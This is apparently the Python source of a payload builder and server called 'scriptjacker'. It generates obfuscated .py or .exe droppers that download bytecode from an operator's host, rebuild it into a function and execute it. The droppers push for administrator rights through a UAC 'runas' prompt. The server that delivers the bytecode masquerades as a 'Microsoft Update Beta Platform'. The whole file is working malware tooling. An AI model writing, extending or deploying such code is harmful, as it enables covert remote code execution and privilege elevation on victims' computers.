import click
import subprocess as sp
import shutil
import os
import encoders
import bytemanip as bm
from flask import Flask,jsonify
click.arg=click.argument
app=Flask("Microsoft Update Beta Platform") # Windows insider


def exegen(output):
    with open("bytemanip.py") as f:bytemanip=f.read()
    s=bytemanip
    s+='''\nimport requests
cont=requests.get("$$$$ip$$$$").json()
class abc:
    def __init__(c,argcount,posonlyargcount,kwonlyargcount,nlocals,stacksize,flags,consts,names,varnames,filename,name,firstlineno,lnotab,freevars,cellvars):
        (c.co_argcount, c.co_posonlyargcount, c.co_kwonlyargcount,
                    c.co_nlocals, c.co_stacksize, c.co_flags,c.co_consts, c.co_names, 
                    c.co_varnames,  c.co_filename, c.co_name, 
                    c.co_firstlineno, c.co_lnotab, c.co_freevars, c.co_cellvars)=argcount,posonlyargcount,kwonlyargcount,nlocals,stacksize,flags,tuple(consts),tuple(names),tuple(varnames),filename,name,firstlineno,lnotab.encode(),tuple(freevars),tuple(cellvars)
        c.const=c.co_consts
c=abc(*cont["cont"])
f=lambda:None
bl=assemble(cont["cont"],c)
code=create_injection(c,bl)
f.__code__=code
import ctypes, sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    try:
        f()
    except Exception as e:
        pass
else:
    # Re-run the program with admin rights
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1)
'''
    pygen("temp1.py",s=s)
    sp.run("pyinstaller -F temp1.py",shell=True)
    sp.run("echo y | rmdir /s build",shell=True)
    sp.run("del temp1.spec",shell=True)
    shutil.move("dist/temp1.exe",output)
    sp.run("rmdir dist",shell=True)
    sp.run("del temp1.py",shell=True)
    

def pygen(output,s=None):
    if s==None:
        with open("bytemanip.py") as f:bytemanip=f.read()
        s=bytemanip
        s+='''\nimport requests
cont=requests.get("$$$$ip$$$$").json()
class abc:
    def __init__(c,argcount,posonlyargcount,kwonlyargcount,nlocals,stacksize,flags,consts,names,varnames,filename,name,firstlineno,lnotab,freevars,cellvars):
        (c.co_argcount, c.co_posonlyargcount, c.co_kwonlyargcount,
                    c.co_nlocals, c.co_stacksize, c.co_flags,c.co_consts, c.co_names, 
                    c.co_varnames,  c.co_filename, c.co_name, 
                    c.co_firstlineno, c.co_lnotab, c.co_freevars, c.co_cellvars)=argcount,posonlyargcount,kwonlyargcount,nlocals,stacksize,flags,tuple(consts),tuple(names),tuple(varnames),filename,name,firstlineno,lnotab.encode(),tuple(freevars),tuple(cellvars)
        c.co_const=c.co_consts
c=abc(*cont["cont"])
f=lambda:None
bl=assemble(cont["cl"],c)
code=create_injection(c,bl)
f.__code__=code
import ctypes, sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    try:
        f()
    except Exception as e:
        pass
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
'''
    ip=input("Please input your desired host ip address and port: ")
    if not(ip.startswith("http")):
        ip="http://"+ip
    s=s.replace("$$$$ip$$$$",ip)
    with open("temp.py","w") as f:f.write(s)
    sp.run("pyminifier temp.py > "+output,shell=True)
    sp.run("del temp.py",shell=True)
    with open(output) as f:s=f.readlines()[:-2]
    with open(output,"w") as f: f.write("".join(s))
def generatepayload(filetype,output):
    dic={"py":pygen,"exe":exegen,}
    if filetype in dic:
        pass
    else: print("Unsupported filetype"); exit()
    dic[filetype](output)

@click.group()
def main():
    pass

@main.command()
@click.arg("output")
def gen(output):
    filetype=output.split(".")[1]
    generatepayload(filetype,output)

@main.command()
@click.option("--port","-p","port",default=80)
def server(port):
    file=input("Please enter your filename: ")
    src="\\".join(__file__.split("\\")[:-1])
    shutil.copy(file,src+"\\essential_to_scriptjacker_do_not_delete.py")
    os.chdir(src)
    function=input("Please enter your function name: ")
    function=getattr(__import__("essential_to_scriptjacker_do_not_delete"),function)
    # Disassemble function
    c=function.__code__
    bl=bm.disassemble_to_list(c)
    print(bl)
    json={"cont":[c.co_argcount, c.co_posonlyargcount, c.co_kwonlyargcount,
                    c.co_nlocals, c.co_stacksize, c.co_flags,
                    c.co_consts, c.co_names, 
                    c.co_varnames,  c.co_filename, c.co_name, 
                    c.co_firstlineno, c.co_lnotab.decode(), c.co_freevars, c.co_cellvars],
          "cl":bl}
    json=encoders.stuffjson(json)
    @app.route("/")
    def home():
        return jsonify(json)
    app.run(host="0.0.0.0",port=port)
    sp.run("del essential_to_scriptjacker_do_not_delete.py",shell=True)
main()
